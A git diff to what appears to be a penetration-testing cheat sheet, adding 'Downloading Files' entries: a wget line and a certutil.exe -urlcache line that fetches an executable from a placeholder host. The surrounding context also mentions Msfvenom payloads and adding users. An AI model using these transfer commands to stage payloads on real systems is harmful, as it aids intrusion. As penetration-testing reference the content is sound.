@@ -44,6 +44,10 @@ scp file/you/want `user@ip`:/path/to/store <br/>
 python -m SimpleHTTPServer [port] `By default will listen on 8000`<br/>
 python3 -m http.server [port] `By default will listen on 8000`<br/>
 
+### Downloading Files
+
+wget http://<ip>:port/<file>
+
 # Windows
 
 ### Adding User
@@ -70,6 +74,10 @@ attrib -h filename `remove hidden bit`
 dir /a `show all hidden files & folder`<br/>
 dir /a:d `show only hidden folder`<br/>
 dir /a:h `show only hidden files`<br/>
+
+### Downloading Files
+
+certutil.exe -urlcache -f http://<ip>:<port>/<file> ouput.exe
 
 # Msfvenom
 ### List All Payloads
